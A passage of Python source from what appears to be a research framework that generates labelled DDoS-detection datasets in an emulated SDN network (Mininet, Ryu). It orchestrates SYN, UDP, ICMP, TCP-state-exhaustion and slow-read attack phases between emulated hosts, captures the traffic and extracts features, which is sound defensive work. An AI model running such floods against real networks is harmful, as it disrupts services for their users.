    if flow_label_timeline and 'end_time' not in flow_label_timeline[-1]:
        flow_label_timeline[-1]['end_time'] = start_time
    
    flow_label_timeline.append({
        'start_time': start_time,
        'label': label
    })
    logger.info(f"Timeline updated: {label} phase started at {start_time}")

def collect_flow_stats(duration, output_file, flow_label_timeline, stop_event=None, controller_ip='127.0.0.1', controller_port=8080):
    """Collects flow statistics from the Ryu controller's REST API periodically and saves them to a CSV file."""
    logger.info(f"Starting flow statistics collection for {duration} seconds...")
    flow_data = []
    start_time = time.time()
    api_url = f"http://{controller_ip}:{controller_port}/flows"

    while time.time() - start_time < duration:
        if stop_event and stop_event.is_set():
            logger.info("Flow collection received stop signal, ending gracefully.")
            break
            
        try:
            response = requests.get(api_url)
            response.raise_for_status()
            flows = response.json()
            
            timestamp = datetime.now().timestamp()
            for flow in flows:
                in_port, eth_src, eth_dst, out_port = parse_flow_match_actions(flow.get('match', ''), flow.get('actions', ''))

                label_multi = _get_label_for_timestamp(timestamp, flow_label_timeline)
                label_binary = 1 if label_multi != 'normal' else 0

                flow_entry = {
                    'timestamp': timestamp,
                    'switch_id': flow.get('switch_id'),
                    'table_id': flow.get('table_id'),
                    'cookie': flow.get('cookie'),
                    'priority': flow.get('priority'),
                    'in_port': in_port,
                    'eth_src': eth_src,
                    'eth_dst': eth_dst,
                    'out_port': out_port,
                    'packet_count': flow.get('packet_count'),
                    'byte_count': flow.get('byte_count'),
                    'duration_sec': flow.get('duration_sec'),
                    'duration_nsec': flow.get('duration_nsec'),
                    'avg_pkt_size': 0,
                    'pkt_rate': 0,
                    'byte_rate': 0,
                    'Label_multi': label_multi,
                    'Label_binary': label_binary
                }
                
                duration_sec = flow.get('duration_sec', 0)
                duration_nsec = flow.get('duration_nsec', 0)
                packet_count = flow.get('packet_count', 0)
                byte_count = flow.get('byte_count', 0)

                total_duration = duration_sec + (duration_nsec / 1_000_000_000)

                if packet_count > 0:
                    flow_entry['avg_pkt_size'] = byte_count / packet_count
                if total_duration > 0:
                    flow_entry['pkt_rate'] = packet_count / total_duration
                    flow_entry['byte_rate'] = byte_count / total_duration
                
                flow_data.append(flow_entry)
            time.sleep(1)
        except requests.exceptions.RequestException as e:
            if stop_event and stop_event.is_set():
                logger.info("Flow collection received stop signal during error handling, ending gracefully.")
                break
            logger.error(f"Error collecting flow stats: {e}")
            time.sleep(5)
    
    if flow_label_timeline and 'end_time' not in flow_label_timeline[-1]:
        flow_label_timeline[-1]['end_time'] = time.time()
        logger.info("Flow timeline collection completed.")
    
    if flow_data:
        df = pd.DataFrame(flow_data)
        ordered_columns = [
            'timestamp', 'switch_id', 'table_id', 'cookie', 'priority',
            'in_port', 'eth_src', 'eth_dst', 'out_port',
            'packet_count', 'byte_count', 'duration_sec', 'duration_nsec',
            'avg_pkt_size', 'pkt_rate', 'byte_rate',
            'Label_multi', 'Label_binary'
        ]
        df = df.reindex(columns=ordered_columns)
        df.to_csv(output_file, index=False)
        logger.info(f"Flow statistics saved to {output_file.relative_to(BASE_DIR)}")
    else:
        logger.warning("No flow data collected.")

def stop_capture(process):
    """Stop the tcpdump process."""
    logger.info(f"Stopping packet capture (PID: {process.pid})...")
    try:
        process.send_signal(signal.SIGINT)
        process.wait(timeout=30)
    except subprocess.TimeoutExpired:
        logger.warning(f"tcpdump (PID: {process.pid}) did not terminate gracefully. Forcing kill.")
        process.kill()
    logger.info("Packet capture stopped.")

def run_traffic_scenario(net, flow_label_timeline, scenario_durations, total_scenario_duration, config_file_path=None):
    """Orchestrate the traffic generation phases with enhanced adversarial attacks."""
    if not net:
        logger.error("Mininet network object is not valid. Aborting traffic scenario.")
        return

    logger.info("Starting v3.0 traffic generation scenario with 30-feature extraction...")
    
    # Set CPU affinity for attack generation
    if cpu_manager:
        cpu_manager.set_process_affinity('attacks')
        logger.info("✅ Set CPU affinity for attack generation processes")
    
    phase_timings = {}
    scenario_start_time = time.time()

    capture_procs = {}
    flow_collector_thread = None
    flow_stop_event = threading.Event()

    try:
        # Phase 1: Initialization
        phase_start = time.time()
        logger.info(f"Phase 1: Initialization ({scenario_durations['initialization']}s)...")
        time.sleep(scenario_durations['initialization'])
        phase_timings['initialization'] = time.time() - phase_start

        # Start flow collection
        flow_collector_thread = threading.Thread(
            target=collect_flow_stats,
            args=(total_scenario_duration, OUTPUT_FLOW_CSV_FILE, flow_label_timeline, flow_stop_event)
        )
        flow_collector_thread.daemon = False
        flow_collector_thread.start()
        logger.info("Flow statistics collection started in background.")

        # Phase 2: Normal Traffic
        phase_start = time.time()
        logger.info(f"Phase 2: Normal Traffic ({scenario_durations['normal_traffic']}s)...")
        update_flow_timeline(flow_label_timeline, 'normal')
        capture_procs['normal'] = start_capture(net, PCAP_FILE_NORMAL)
        time.sleep(2)
        run_benign_traffic(net, scenario_durations['normal_traffic'], OUTPUT_DIR, HOST_IPS)
        stop_capture(capture_procs['normal'])
        phase_timings['normal_traffic'] = time.time() - phase_start

        # Phase 3.1: Enhanced Traditional DDoS Attacks
        logger.info("Phase 3.1: Enhanced Traditional DDoS Attacks...")
        h1, h2, h4, h6 = net.get('h1', 'h2', 'h4', 'h6')

        phase_start = time.time()
        attack_logger.info(f"Attack: Enhanced SYN Flood ({scenario_durations['syn_flood']}s) | h1 -> h6")
        update_flow_timeline(flow_label_timeline, 'syn_flood')
        capture_procs['syn_flood'] = start_capture(net, PCAP_FILE_SYN_FLOOD)
        time.sleep(2)
        attack_proc_syn = run_syn_flood(h1, HOST_IPS['h6'], duration=scenario_durations['syn_flood'])
        attack_proc_syn.wait()
        stop_capture(capture_procs['syn_flood'])
        phase_timings['syn_flood'] = time.time() - phase_start
        attack_logger.info("Attack: Enhanced SYN Flood completed.")

        phase_start = time.time()
        attack_logger.info(f"Attack: Enhanced UDP Flood ({scenario_durations['udp_flood']}s) | h2 -> h4")
        update_flow_timeline(flow_label_timeline, 'udp_flood')
        capture_procs['udp_flood'] = start_capture(net, PCAP_FILE_UDP_FLOOD)
        time.sleep(5)
        attack_proc_udp = run_udp_flood(h2, HOST_IPS['h4'], duration=scenario_durations['udp_flood'])
        attack_proc_udp.wait()
        stop_capture(capture_procs['udp_flood'])
        phase_timings['udp_flood'] = time.time() - phase_start
        attack_logger.info("Attack: Enhanced UDP Flood completed.")

        phase_start = time.time()
        attack_logger.info(f"Attack: Enhanced ICMP Flood ({scenario_durations['icmp_flood']}s) | h2 -> h4")
        update_flow_timeline(flow_label_timeline, 'icmp_flood')
        capture_procs['icmp_flood'] = start_capture(net, PCAP_FILE_ICMP_FLOOD)
        time.sleep(2)
        attack_proc_icmp = run_icmp_flood(h2, HOST_IPS['h4'], duration=scenario_durations['icmp_flood'])
        attack_proc_icmp.wait()
        stop_capture(capture_procs['icmp_flood'])
        phase_timings['icmp_flood'] = time.time() - phase_start
        attack_logger.info("Attack: Enhanced ICMP Flood completed.")

        # Phase 3.2: ENHANCED Adversarial DDoS Attacks
        logger.info("Phase 3.2: ENHANCED Adversarial DDoS Attacks...")

        phase_start = time.time()
        attack_logger.info(f"Attack: ENHANCED Adversarial TCP State Exhaustion ({scenario_durations['ad_syn']}s) | h2 -> h6")
        update_flow_timeline(flow_label_timeline, 'ad_syn')
        capture_procs['ad_syn'] = start_capture(net, PCAP_FILE_AD_SYN)
        time.sleep(2)
        run_enhanced_adv_ddos(h2, HOST_IPS['h6'], duration=scenario_durations['ad_syn'], attack_variant="ad_syn")
        stop_capture(capture_procs['ad_syn'])
        phase_timings['ad_syn'] = time.time() - phase_start

        phase_start = time.time()
        attack_logger.info(f"Attack: ENHANCED Adversarial Application Layer ({scenario_durations['ad_udp']}s) | h2 -> h6")
        update_flow_timeline(flow_label_timeline, 'ad_udp')
        capture_procs['ad_udp'] = start_capture(net, PCAP_FILE_AD_UDP)
        time.sleep(2)
        run_enhanced_adv_ddos(h2, HOST_IPS['h6'], duration=scenario_durations['ad_udp'], attack_variant="ad_udp")
        stop_capture(capture_procs['ad_udp'])
        phase_timings['ad_udp'] = time.time() - phase_start

        phase_start = time.time()
        attack_logger.info(f"Attack: ENHANCED Adversarial Slow Read ({scenario_durations['ad_slow']}s) | h2 -> h6")
        update_flow_timeline(flow_label_timeline, 'ad_slow')
        h6 = net.get('h6')
        capture_procs['h6_slow_read'] = start_capture(net, PCAP_FILE_H6_SLOW_READ, host=h6)
        capture_procs['ad_slow'] = start_capture(net, PCAP_FILE_AD_SLOW)
        time.sleep(2)
        
        logger.info("Proceeding with ENHANCED adversarial slow attack")
        logger.info("Attack traffic will be captured via h6_slow_read.pcap and ad_slow.pcap")

        attack_proc_ad_slow = run_enhanced_adv_ddos(h2, HOST_IPS['h6'], duration=scenario_durations['ad_slow'], attack_variant="slow_read", output_dir=OUTPUT_DIR)
        stop_capture(capture_procs['ad_slow'])
        stop_capture(capture_procs['h6_slow_read'])
        phase_timings['ad_slow'] = time.time() - phase_start
        attack_logger.info("Attack: ENHANCED Adversarial Slow Read completed.")

        # Phase 4: Cooldown
        phase_start = time.time()
        logger.info(f"Phase 4: Cooldown ({scenario_durations['cooldown']}s)...")
        update_flow_timeline(flow_label_timeline, 'normal')
        time.sleep(scenario_durations['cooldown'])
        phase_timings['cooldown'] = time.time() - phase_start

    except Exception as e:
        logger.error(f"An error occurred during traffic scenario: {e}", exc_info=True)
    finally:
        # Cleanup
        for proc_name, proc in capture_procs.items():
            if proc and proc.poll() is None:
                logger.warning(f"Capture process for {proc_name} was still running. Stopping it.")
                stop_capture(proc)
        
        if flow_collector_thread and flow_collector_thread.is_alive():
            logger.info("Signaling flow collection thread to stop...")
            flow_stop_event.set()
            logger.info("Waiting for flow collection thread to finish...")
            flow_collector_thread.join(timeout=30)
            if flow_collector_thread.is_alive():
                logger.warning("Flow collection thread did not finish within timeout")
            else:
                logger.info("Flow collection thread finished successfully")
        
        # Timing summary
        total_scenario_time = time.time() - scenario_start_time
        
        logger.info("=" * 60)
        logger.info("v3.0 30-FEATURE TIMING SUMMARY")
        logger.info("=" * 60)
        if config_file_path:
            logger.info(f"Configuration File: {config_file_path}")
            logger.info("")
        logger.info(f"Total Scenario Runtime: {total_scenario_time:.2f} seconds ({total_scenario_time/60:.2f} minutes)")
        logger.info("")
        logger.info("Phase-by-Phase Breakdown:")
        
        # Enhanced Traditional attacks
        logger.info("  Enhanced Traditional Attacks:")
        for attack in ['syn_flood', 'udp_flood', 'icmp_flood']:
            if attack in phase_timings:
                enhanced_name = f"Enhanced {attack.replace('_', ' ').title()}"
                logger.info(f"    {enhanced_name}: {phase_timings[attack]:.2f}s (configured: {scenario_durations.get(attack, 'N/A')}s)")
        
        # ENHANCED Adversarial attacks
        logger.info("  ENHANCED Adversarial Attacks:")
        for attack in ['ad_syn', 'ad_udp', 'ad_slow']:
            if attack in phase_timings:
                attack_name = {'ad_syn': 'ENHANCED TCP State Exhaustion', 'ad_udp': 'ENHANCED Application Layer', 'ad_slow': 'ENHANCED Slow Read'}[attack]
                logger.info(f"    {attack_name}: {phase_timings[attack]:.2f}s (configured: {scenario_durations.get(attack, 'N/A')}s)")
        
        # Other phases
        for phase in ['initialization', 'normal_traffic', 'cooldown']:
            if phase in phase_timings:
                logger.info(f"  {phase.title()}: {phase_timings[phase]:.2f}s (configured: {scenario_durations.get(phase, 'N/A')}s)")
        
        logger.info("=" * 60)
        logger.info("v3.0 30-feature traffic generation scenario finished.")

def cleanup(controller_proc, mininet_running):
    """Clean up all running processes and network configurations."""
    logger.info("Cleaning up resources...")
    if controller_proc:
        logger.info(f"Terminating Ryu controller (PID: {controller_proc.pid})...")
        controller_proc.terminate()
        controller_proc.wait()

    logger.info("Cleaning up Mininet environment...")
    cleanup_cmd = ["mn", "-c"]
    subprocess.run(cleanup_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    logger.info("Cleanup complete.")

def process_single_pcap_30_features(pcap_file_path, label_name, output_dir):
    """Process a single PCAP file and return the resulting DataFrame with 30 features."""
    import pandas as pd
    from pathlib import Path
    import logging
    
    worker_logger = logging.getLogger(f'worker_{label_name}')
    worker_logger.setLevel(logging.INFO)
    
    pcap_file = Path(pcap_file_path)
    output_dir = Path(output_dir)
    
    try:
        worker_logger.info(f"Processing {pcap_file.name} with label '{label_name}' for 30 features...")
        
        if not pcap_file.exists():
            worker_logger.warning(f"PCAP file not found: {pcap_file.name}. Skipping.")
            return None

        integrity_results = verify_pcap_integrity(pcap_file)
        if not integrity_results['valid']:
            worker_logger.error(f"PCAP integrity check failed for {pcap_file.name}: {integrity_results['error']}")
            worker_logger.warning("Continuing with PCAP processing despite integrity issues...")
        else:
            worker_logger.info(f"PCAP integrity check passed for {pcap_file.name}: {integrity_results['total_packets']} packets")

        try:
            corrected_packets, stats = validate_and_fix_pcap_timestamps(pcap_file)
            pcap_start_time = stats['baseline_time']
            worker_logger.info(f"Using baseline timestamp for labeling {pcap_file.name}: {pcap_start_time}")
        except Exception as e:
            worker_logger.error(f"Could not process PCAP timestamps for {pcap_file}: {e}. Skipping labeling for this file.")
            return None

        label_timeline = [{
            'start_time': pcap_start_time,
            'end_time': pcap_start_time + 3600,
            'label': label_name
        }]
        
        temp_csv_file = output_dir / f"temp_{label_name}_30.csv"
        process_pcap_to_30_features_csv(
            str(pcap_file), 
            str(temp_csv_file), 
            label_timeline
        )
        
        if temp_csv_file.exists():
            df = pd.read_csv(temp_csv_file)
            temp_csv_file.unlink()
            worker_logger.info(f"Successfully processed {pcap_file.name}: {len(df)} records with 30 features")
            return df
        else:
            worker_logger.warning(f"No CSV generated for {pcap_file.name}.")
            return None
            
    except Exception as e:
        worker_logger.error(f"Error processing {pcap_file.name}: {e}")
        return None

def process_pcaps_parallel_30_features(pcap_files_to_process, output_dir, max_workers=6):
    """Process multiple PCAP files in parallel using multiprocessing with CPU affinity for 30 features."""
    logger.info(f"Starting parallel PCAP processing with {max_workers} workers for 30-feature extraction...")
    
    # Set CPU affinity for PCAP processing (use all cores)
    if cpu_manager:
        cpu_manager.set_process_affinity('pcap')
        logger.info("✅ Set CPU affinity for PCAP processing (all cores)")
    
    all_labeled_dfs = []
    
    with ProcessPoolExecutor(max_workers=max_workers) as executor:
        future_to_pcap = {}
        for pcap_file, label_name in pcap_files_to_process:
            future = executor.submit(process_single_pcap_30_features, str(pcap_file), label_name, str(output_dir))
            future_to_pcap[future] = (pcap_file, label_name)
        
        for future in future_to_pcap:
            pcap_file, label_name = future_to_pcap[future]
            try:
                df = future.result()
                if df is not None:
                    all_labeled_dfs.append(df)
                    logger.info(f"✓ Completed processing {pcap_file.name} ({len(df)} records with 30 features)")
                else:
                    logger.warning(f"✗ Failed to process {pcap_file.name}")
            except Exception as e:
                logger.error(f"✗ Error processing {pcap_file.name}: {e}")
    
    logger.info(f"Parallel PCAP processing completed. Processed {len(all_labeled_dfs)} files successfully with 30-feature extraction.")
    return all_labeled_dfs

def main():
    """Main entry point for the v3.0 30-feature dataset generation framework."""
    parser = argparse.ArgumentParser(description="AdDDoSDN v3.0 30-Feature Real-Time DDoS Detection Dataset Generation")
    parser.add_argument(
        'config_file', 
        nargs='?', 
        default='config.json',
        help='Path to configuration JSON file (default: config.json)'
    )
    parser.add_argument('--cores', type=int, default=min(4, cpu_count()), 
                       help=f'Number of CPU cores to use for PCAP processing (default: {min(4, cpu_count())}, max: {cpu_count()})')
    parser.add_argument('--max-cores', type=int, default=16,
                       help='Maximum number of CPU cores available for optimal allocation (default: 16)')
    args = parser.parse_args()
    
    # Initialize CPU core manager
    global cpu_manager
    cpu_manager = CPUCoreManager(total_cores=args.max_cores)
    
    main_start_time = time.time()

    initialize_logging(OUTPUT_DIR, console_level=logging.INFO)
    logger = get_main_logger(OUTPUT_DIR)
    
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    
    # v3.0 header
    ConsoleOutput.print_header("AdDDoSDN Dataset Generation Framework v3.0")
    logger.info("🎯 30-FEATURE REAL-TIME DDOS DETECTION DATASET")
    logger.info("📊 Feature Set: 24 pure live + 4 minimal calculation + 2 labels = 30 total")
    logger.info("⚡ Optimized for <1ms real-time extraction latency")
    logger.info("🔧 CPU Affinity Optimization ENABLED")
    logger.info("🚀 Independent implementation (preserves mainv1 & mainv2)")
    
    # Print CPU core allocation
    cpu_manager.print_allocation()

    logger.info("Cleaning up any previous Mininet instances...")
    subprocess.run(["mn", "-c"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    logger.info("Mininet cleanup complete.")

    verify_tools()

    config_file_path = Path(args.config_file)
    if not config_file_path.is_absolute():
        config_file_path = BASE_DIR / config_file_path
    
    if not config_file_path.exists():
        logger.error(f"Config file not found: {config_file_path}")
        sys.exit(1)
    
    logger.info(f"Using configuration file: {config_file_path}")
    with open(config_file_path, 'r') as f:
        config = json.load(f)
    
    scenario_durations = config.get("scenario_durations", {})
    
    initialization_duration = scenario_durations.get("initialization", 5)
    normal_traffic_duration = scenario_durations.get("normal_traffic", 5)
    syn_flood_duration = scenario_durations.get("syn_flood", 5)
    udp_flood_duration = scenario_durations.get("udp_flood", 5)
    icmp_flood_duration = scenario_durations.get("icmp_flood", 5)
    ad_syn_duration = scenario_durations.get("ad_syn", 5)
    ad_udp_duration = scenario_durations.get("ad_udp", 5)
    ad_slow_duration = scenario_durations.get("ad_slow", 5)
    cooldown_duration = scenario_durations.get("cooldown", 10)

    controller_process = None
    mininet_network = None
    
    try:
        # Start Controller
        controller_process = start_controller()
        if not check_controller_health():
            raise RuntimeError("Controller health check failed. Aborting.")

        # Test /hello endpoint
        logger.info("Testing /hello endpoint...")
        try:
            import requests
            response = requests.get("http://localhost:8080/hello")
            response.raise_for_status()
            if response.json() == {"message": "Hello from Ryu Controller!"}:
                logger.info("Test /hello endpoint: PASSED")
            else:
                logger.error(f"Test /hello endpoint: FAILED - Unexpected response: {response.json()}")
                raise RuntimeError("Hello endpoint test failed.")
        except requests.exceptions.ConnectionError as e:
            logger.error(f"Test /hello endpoint: FAILED - Could not connect to controller API: {e}")
            raise RuntimeError("Hello endpoint test failed due to connection error.")
        except Exception as e:
            logger.error(f"Test /hello endpoint: FAILED - An unexpected error occurred: {e}")
            raise RuntimeError("Hello endpoint test failed.")

        # Setup Mininet
        mininet_network = setup_mininet()

        # Run pingall test
        run_mininet_pingall_test(mininet_network)

        scenario_start_time = time.time()

        flow_label_timeline = []
        
        config_duration = normal_traffic_duration + syn_flood_duration + udp_flood_duration + icmp_flood_duration + \
                         ad_syn_duration + ad_udp_duration + ad_slow_duration + cooldown_duration
        total_scenario_duration = config_duration + 120

        # Run v3.0 Scenario
        run_traffic_scenario(mininet_network, flow_label_timeline, scenario_durations, total_scenario_duration, config_file_path)

        logger.info("v3.0 PCAP generation complete.")

        pcap_files_to_process = [
            (PCAP_FILE_NORMAL, 'normal'),
            (PCAP_FILE_SYN_FLOOD, 'syn_flood'),
            (PCAP_FILE_UDP_FLOOD, 'udp_flood'),
            (PCAP_FILE_ICMP_FLOOD, 'icmp_flood'),
            (PCAP_FILE_AD_SYN, 'ad_syn'),
            (PCAP_FILE_AD_UDP, 'ad_udp'),
            (PCAP_FILE_AD_SLOW, 'ad_slow'),
            (PCAP_FILE_H6_SLOW_READ, 'h6_slow_read'),
        ]

        max_workers = min(max(1, args.cores), cpu_count())
        if args.cores > cpu_count():
            logger.warning(f"Requested {args.cores} cores, but only {cpu_count()} available. Using {max_workers} cores.")
        
        logger.info(f"Processing {len(pcap_files_to_process)} PCAP files using {max_workers} CPU cores for 30-feature extraction...")
        
        pcap_start_time = time.time()
        all_labeled_dfs = process_pcaps_parallel_30_features(pcap_files_to_process, OUTPUT_DIR, max_workers)
        pcap_processing_time = time.time() - pcap_start_time
        
        logger.info(f"Parallel 30-feature PCAP processing completed in {pcap_processing_time:.2f} seconds ({pcap_processing_time/60:.2f} minutes)")

        if all_labeled_dfs:
            final_df = pd.concat(all_labeled_dfs, ignore_index=True)
            final_df.to_csv(OUTPUT_CSV_FILE, index=False)
            logger.info(f"v3.0 30-feature combined labeled CSV generated at: {OUTPUT_CSV_FILE.relative_to(BASE_DIR)}")
            
            if OUTPUT_CSV_FILE.exists():
                logger.info("v3.0 final 30-feature combined CSV created successfully.")
                try:
                    packet_df = pd.read_csv(OUTPUT_CSV_FILE)
                    if 'Label_multi' in packet_df.columns:
                        packet_counts = packet_df['Label_multi'].value_counts()
                        logger.info("\n--- v3.0 30-Feature Packet Counts by Class ---")
                        for label, count in packet_counts.items():
                            logger.info(f"  {label}: {count} packets")
                    else:
                        logger.warning("Label_multi column not found in packet_features_30.csv.")
                except Exception as e:
                    logger.error(f"Error reading or processing packet_features_30.csv: {e}")
            else:
                logger.error("Failed to create v3.0 final 30-feature combined CSV.")
        else:
            logger.error("No labeled dataframes were generated. v3.0 final CSV will not be created.")

        # Check if flow data was collected
        if OUTPUT_FLOW_CSV_FILE.exists():
            logger.info(f"v3.0 flow-level dataset generated at: {OUTPUT_FLOW_CSV_FILE.relative_to(BASE_DIR)}")
            try:
                flow_df = pd.read_csv(OUTPUT_FLOW_CSV_FILE)
                if 'Label_multi' in flow_df.columns:
                    flow_counts = flow_df['Label_multi'].value_counts()
                    logger.info("\n--- v3.0 Flow Feature Counts by Class ---")
                    for label, count in flow_counts.items():
                        logger.info(f"  {label}: {count} flows")
                else:
                    logger.warning("Label_multi column not found in flow_features.csv.")
            except Exception as e:
                logger.error(f"Error reading or processing flow_features.csv: {e}")
        else:
            logger.warning("No v3.0 flow-level dataset was generated.")
            
        # Generate and display dataset summary
        logger.info("Generating v3.0 dataset summary...")
        print_dataset_summary(OUTPUT_DIR, logger)
        
        # Run timeline analysis
        if OUTPUT_CSV_FILE.exists() and OUTPUT_FLOW_CSV_FILE.exists():
            logger.info("Running v3.0 timeline analysis...")
            timeline_results = analyze_dataset_timeline(OUTPUT_CSV_FILE, OUTPUT_FLOW_CSV_FILE, logger)
            
            if timeline_results['score'] < 70:
                print_detailed_timeline_report(timeline_results, logger)
            
            timeline_score = timeline_results['score']
            timeline_status = timeline_results['status']
        else:
            logger.warning("Skipping timeline analysis - missing CSV files")
            timeline_score = 0
            timeline_status = "FILES_MISSING"
        
        # Final v3.0 execution summary
        total_execution_time = time.time() - main_start_time
        logger.info("=" * 80)
        logger.info("v3.0 30-FEATURE FINAL EXECUTION SUMMARY")
        logger.info("=" * 80)
        logger.info(f"🚀 Framework Version: v3.0")
        logger.info(f"📊 Feature Set: 30 features optimized for real-time DDoS detection")
        logger.info(f"🎯 Target Latency: <1ms per packet extraction")
        logger.info(f"⚡ CPU Affinity Optimization: ENABLED")
        logger.info(f"🖥️  Total Cores Utilized: {cpu_manager.total_cores if cpu_manager else 'Unknown'}")
        logger.info(f"⏱️  Total Execution Time: {total_execution_time:.2f} seconds ({total_execution_time/60:.2f} minutes | {total_execution_time/3600:.2f} hours)")
        logger.info(f"📅 v3.0 Dataset Generation Complete: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        if 'timeline_score' in locals():
            logger.info(f"📈 Timeline Alignment Score: {timeline_score:.1f}%")
            if timeline_score >= 90:
                logger.info("✅ Timeline Quality: EXCELLENT")
            elif timeline_score >= 70:
                logger.info("✅ Timeline Quality: GOOD")
            elif timeline_score >= 50:
                logger.info("⚠️  Timeline Quality: FAIR - Consider adjustments")
            else:
                logger.info("❌ Timeline Quality: POOR - Requires attention")
        
        logger.info("=" * 80)
        logger.info("🎉 v3.0 30-FEATURE REAL-TIME DDOS DETECTION DATASET COMPLETED")
        logger.info("📋 30-Feature Set:")
        logger.info("   • 24 Pure Live Extractable Features (direct packet header fields)")
        logger.info("   • 4 Minimal Calculation Features (lightweight processing)")
        logger.info("   • 2 Labels (multi-class + binary)")
        logger.info("   • Timeline-ordered for ML training compatibility")
        logger.info("   • Optimized for production real-time deployment")
        logger.info("=" * 80)

    except Exception as e:
        logger.error(f"An unexpected error occurred in v3.0 framework: {e}", exc_info=True)
    finally:
        cleanup(controller_process, mininet_network is not None)

if __name__ == "__main__":
    if os.geteuid() != 0:
        logger.error("This v3.0 script must be run as root for Mininet.")
        sys.exit(1)
    main()